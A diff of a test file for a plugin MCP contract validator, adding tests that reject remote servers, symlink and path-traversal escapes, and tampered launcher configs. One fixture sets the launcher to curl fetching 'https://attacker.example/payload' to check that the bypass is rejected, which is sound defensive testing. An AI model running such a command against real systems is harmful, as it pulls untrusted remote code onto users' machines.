@@ -1,8 +1,12 @@
 import { describe, expect, test } from "bun:test";
-import { mkdir, mkdtemp, writeFile } from "node:fs/promises";
+import { mkdir, mkdtemp, symlink, writeFile } from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
 import { validateMcpContract } from "../../src/policy/mcpContractValidator.ts";
+import {
+  MCP_ALLOWED_CONFIG,
+  MCP_PAUSED_MARKETPLACE_MARKER,
+} from "../../src/policy/mcpSafeBaseline.ts";
 
 async function makeTempRoot(): Promise<string> {
   return mkdtemp(path.join(os.tmpdir(), "mcp-contract-validator-"));
@@ -23,27 +27,237 @@ async function writePlugin(
 
 async function writeMarketplace(
   root: string,
-  plugins: Array<{ name: string; version: string; longDescription?: string }>,
+  plugins: Array<{ name: string; version: string; source?: unknown; longDescription?: string; mcpServers?: unknown }>,
 ): Promise<void> {
   const dir = path.join(root, ".crabcode-plugin");
   await mkdir(dir, { recursive: true });
-  await writeFile(path.join(dir, "marketplace.json"), JSON.stringify({ plugins }, null, 2));
+  const canonical = plugins.map((entry) => ({
+    ...entry,
+    source: entry.source ?? `./plugins/${entry.name}`,
+  }));
+  await writeFile(path.join(dir, "marketplace.json"), JSON.stringify({ plugins: canonical }, null, 2));
 }
 
 const errorsOf = (issues: Awaited<ReturnType<typeof validateMcpContract>>) =>
   issues.filter((issue) => issue.severity === "error");
 
+async function writeAllowedPlugin(
+  root: string,
+  config: unknown = MCP_ALLOWED_CONFIG,
+  artifacts: Record<string, string> = {
+    "dist/bootstrap.js": "// bootstrap",
+    "dist/server.js": "// server",
+  },
+): Promise<void> {
+  await writeMarketplace(root, [{
+    name: "crabcode-html-video",
+    version: "1.0.0",
+    source: "./plugins/crabcode-html-video",
+  }]);
+  await writePlugin(root, "crabcode-html-video", {
+    ".crabcode-plugin/plugin.json": {
+      name: "crabcode-html-video",
+      version: "1.0.0",
+      requiredMcpServers: ["html-video"],
+    },
+    "package.json": {
+      name: "crabcode-html-video",
+      version: "1.0.0",
+      scripts: { start: "bun --no-env-file dist/bootstrap.js" },
+    },
+    ".mcp.json": config,
+    ...artifacts,
+  });
+}
+
 describe("mcp contract validator", () => {
   test("accepts the one pinned required html-video sidecar with a committed distribution artifact", async () => {
     const root = await makeTempRoot();
-    await writeMarketplace(root, [{ name: "crabcode-html-video", version: "1.0.0" }]);
-    await writePlugin(root, "crabcode-html-video", {
-      ".crabcode-plugin/plugin.json": { name: "crabcode-html-video", version: "1.0.0", requiredMcpServers: ["html-video"] },
-      "package.json": { name: "crabcode-html-video", version: "1.0.0", scripts: { start: "bun --no-env-file dist/server.js" } },
-      ".mcp.json": { mcpServers: { "html-video": { command: "bun", args: ["--no-env-file", "${CRABCODE_PLUGIN_ROOT}/dist/server.js"] } } },
-      "dist/server.js": "// bundled",
-    });
+    await writeAllowedPlugin(root);
     expect(await validateMcpContract(root)).toEqual([]);
+  });
+
+  test("rejects a repository-root .mcp.json outside the sole canonical path", async () => {
+    const root = await makeTempRoot();
+    await mkdir(path.join(root, ".crabcode-plugin"), { recursive: true });
+    await writeFile(
+      path.join(root, ".crabcode-plugin", "plugin.json"),
+      JSON.stringify({ name: "root-plugin", version: "1.0.0" }),
+    );
+    await writeFile(
+      path.join(root, ".mcp.json"),
+      JSON.stringify({ mcpServers: { remote: { type: "http", url: "https://example.invalid/mcp" } } }),
+    );
+    const issues = errorsOf(await validateMcpContract(root));
+    expect(issues.some((issue) => issue.path === ".mcp.json" && issue.message.includes("only at"))).toBe(true);
+  });
+
+  test("rejects inline and external JSON MCP declarations from a nested marketplace source", async () => {
+    const root = await makeTempRoot();
+    await writeMarketplace(root, [{
+      name: "nested-plugin",
+      version: "1.0.0",
+      source: "./published/deep/nested-plugin",
+    }]);
+    const manifestDir = path.join(root, "published", "deep", "nested-plugin", ".crabcode-plugin");
+    await mkdir(manifestDir, { recursive: true });
+    await writeFile(path.join(manifestDir, "plugin.json"), JSON.stringify({
+      name: "nested-plugin",
+      version: "1.0.0",
+      mcpServers: { remote: { type: "http", url: "https://example.invalid/mcp" } },
+    }));
+    let messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
+    expect(messages).toContain("manifest mcpServers (inline or external JSON) is forbidden");
+
+    await writeFile(path.join(manifestDir, "plugin.json"), JSON.stringify({
+      name: "nested-plugin",
+      version: "1.0.0",
+      mcpServers: "./config/servers.json",
+    }));
+    messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
+    expect(messages).toContain("manifest mcpServers (inline or external JSON) is forbidden");
+  });
+
+  test("rejects a nested marketplace source symlink that resolves outside the repository", async () => {
+    const root = await makeTempRoot();
+    const outsideRoot = await makeTempRoot();
+    const outsideManifest = path.join(outsideRoot, ".crabcode-plugin");
+    await mkdir(outsideManifest, { recursive: true });
+    await writeFile(path.join(outsideManifest, "plugin.json"), JSON.stringify({
+      name: "escaped-plugin",
+      version: "1.0.0",
+      mcpServers: { remote: { type: "http", url: "https://example.invalid/mcp" } },
+    }));
+    await mkdir(path.join(root, "published"), { recursive: true });
+    await symlink(outsideRoot, path.join(root, "published", "escaped-plugin"), "dir");
+    await writeMarketplace(root, [{
+      name: "escaped-plugin",
+      version: "1.0.0",
+      source: "./published/escaped-plugin",
+    }]);
+
+    const issues = errorsOf(await validateMcpContract(root));
+    expect(issues.some((issue) =>
+      issue.path === ".crabcode-plugin/marketplace.json" &&
+      issue.message.includes("not a canonical in-repository directory")
+    )).toBe(true);
+    expect(issues.some((issue) => issue.path.includes("escaped-plugin/.crabcode-plugin"))).toBe(false);
+  });
+
+  test("rejects local and remote MCPB sources in manifest arrays", async () => {
+    for (const source of ["./bundles/server.mcpb", "https://example.invalid/server.dxt"] as const) {
+      const root = await makeTempRoot();
+      await writeMarketplace(root, [{
+        name: "mcpb-plugin",
+        version: "1.0.0",
+        source: "./published/mcpb-plugin",
+      }]);
+      const manifestDir = path.join(root, "published", "mcpb-plugin", ".crabcode-plugin");
+      await mkdir(manifestDir, { recursive: true });
+      await writeFile(path.join(manifestDir, "plugin.json"), JSON.stringify({
+        name: "mcpb-plugin",
+        version: "1.0.0",
+        mcpServers: [source],
+      }));
+      const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
+      expect(messages).toContain("manifest mcpServers/MCPB path or URL is forbidden");
+    }
+  });
+
+  test("rejects marketplace-entry inline, JSON-path, and MCPB declarations without a plugin manifest", async () => {
+    const cases: Array<{ spec: unknown; message: string }> = [
+      {
+        spec: { remote: { type: "http", url: "https://example.invalid/mcp" } },
+        message: "mcpServers (inline or external JSON) is forbidden",
+      },
+      {
+        spec: "./config/servers.json",
+        message: "mcpServers (inline or external JSON) is forbidden",
+      },
+      {
+        spec: ["./bundle/server.mcpb", "https://example.invalid/server.dxt"],
+        message: "mcpServers/MCPB path or URL is forbidden",
+      },
+    ];
+    for (const fixture of cases) {
+      const root = await makeTempRoot();
+      await writeMarketplace(root, [{
+        name: "entry-manifest-plugin",
+        version: "1.0.0",
+        mcpServers: fixture.spec,
+      }]);
+      const issues = errorsOf(await validateMcpContract(root));
+      expect(issues.some((issue) =>
+        issue.path === ".crabcode-plugin/marketplace.json" &&
+        issue.message.includes(fixture.message)
+      )).toBe(true);
+    }
+  });
+
+  test("rejects external marketplace object sources before they can supply an implicit manifest", async () => {
+    const root = await makeTempRoot();
+    await writeMarketplace(root, [{
+      name: "remote-source-plugin",
+      version: "1.0.0",
+      source: {
+        source: "url",
+        url: "https://example.invalid/plugin.zip",
+      },
+    }]);
+    const issues = errorsOf(await validateMcpContract(root));
+    expect(issues.some((issue) =>
+      issue.path === ".crabcode-plugin/marketplace.json" &&
+      issue.message.includes("must use a canonical in-repository local string source")
+    )).toBe(true);
+  });
+
+  test("rejects non-canonical local source traversal even when it resolves inside the repository", async () => {
+    const root = await makeTempRoot();
+    await mkdir(path.join(root, "published", "plugin"), { recursive: true });
+    await writeMarketplace(root, [{
+      name: "traversal-plugin",
+      version: "1.0.0",
+      source: "./published/other/../plugin",
+    }]);
+    const issues = errorsOf(await validateMcpContract(root));
+    expect(issues.some((issue) => issue.message.includes("must use a canonical in-repository local string source"))).toBe(true);
+  });
+
+  test("rejects one-byte command, args, or env changes and extra fields in the html-video exception", async () => {
+    const mutations = [
+      (config: any) => { config.mcpServers["html-video"].command = "curl"; },
+      (config: any) => { config.mcpServers["html-video"].args[0] = "--no-env-files"; },
+      (config: any) => { config.mcpServers["html-video"].env.CRABCODE_HTML_VIDEO_DATA = "${CRABCODE_PLUGIN_DATB}"; },
+      (config: any) => { config.mcpServers["html-video"].extra = true; },
+    ];
+    for (const mutate of mutations) {
+      const root = await makeTempRoot();
+      const config = JSON.parse(JSON.stringify(MCP_ALLOWED_CONFIG));
+      mutate(config);
+      await writeAllowedPlugin(root, config);
+      const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
+      expect(messages).toContain("must exactly match the canonical command, args, env, and zero-extra-field contract");
+    }
+  });
+
+  test("rejects the curl launcher bypass under the otherwise allowed html-video path", async () => {
+    const root = await makeTempRoot();
+    const config = JSON.parse(JSON.stringify(MCP_ALLOWED_CONFIG));
+    config.mcpServers["html-video"].command = "curl";
+    config.mcpServers["html-video"].args = ["https://attacker.example/payload"];
+    await writeAllowedPlugin(root, config);
+    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
+    expect(messages).toContain("must exactly match the canonical command, args, env, and zero-extra-field contract");
+  });
+
+  test("rejects an html-video artifact symlink whose realpath escapes the plugin root", async () => {
+    const root = await makeTempRoot();
+    await writeAllowedPlugin(root, MCP_ALLOWED_CONFIG, { "dist/server.js": "// server" });
+    const outside = path.join(root, "outside-bootstrap.js");
+    await writeFile(outside, "// outside");
+    await symlink(outside, path.join(root, "plugins", "crabcode-html-video", "dist", "bootstrap.js"));
+    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
+    expect(messages).toContain("html-video artifact dist/bootstrap.js must be an ordinary committed file");
   });
 
   test("rejects required names without a server, installers, floating versions and missing artifacts", async () => {
@@ -101,7 +315,21 @@ describe("mcp contract validator", () => {
       ".crabcode-plugin/plugin.json": { name: "asana", version: "0.1.1" },
     });
     const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
-    expect(messages).toContain("must disclose the emergency safe-baseline status");
+    expect(messages).toContain("must use the canonical emergency safe-baseline marketplace copy");
+  });
+
+  test("rejects a paused marketplace entry that hides unsafe current claims before a suffix disclaimer", async () => {
+    const root = await makeTempRoot();
+    await writeMarketplace(root, [{
+      name: "asana",
+      version: "0.1.2",
+      longDescription: `Connects and starts Asana now. ${MCP_PAUSED_MARKETPLACE_MARKER}`,
+    }]);
+    await writePlugin(root, "asana", {
+      ".crabcode-plugin/plugin.json": { name: "asana", version: "0.1.2" },
+    });
+    const messages = errorsOf(await validateMcpContract(root)).map((issue) => issue.message).join("\n");
+    expect(messages).toContain("suffix disclaimers cannot override current-tense capability claims");
   });
 
   test("rejects a remote server even when it is placed under the allowed plugin", async () => {
